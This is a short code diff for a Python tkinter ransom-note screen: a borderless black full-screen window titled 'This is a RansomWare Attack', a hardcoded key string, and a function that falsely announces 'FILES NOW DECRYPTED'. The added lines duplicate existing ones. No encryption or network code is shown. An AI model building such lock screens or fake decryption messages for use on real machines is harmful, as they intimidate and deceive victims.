@@ -29,6 +29,15 @@ class FullScreenApp(object):
 root.title("This is a RansomWare Attack")
 root.configure(background="black")
 root.overrideredirect(True)
+tempkey = "JacobIsAGreatCoder"
+
+def submit_function():
+    count = 0
+    while count < 1:
+            tkMessageBox.showinfo("CHECKING KEY...", "FILES NOW DECRYPTED. THANK YOU!!!")
+            count += 1
+    exit()
+root.overrideredirect(True)
 tempkey = "Q1W2E3R4T5Y6U7I8O9P0123"
 
 def submit_function():
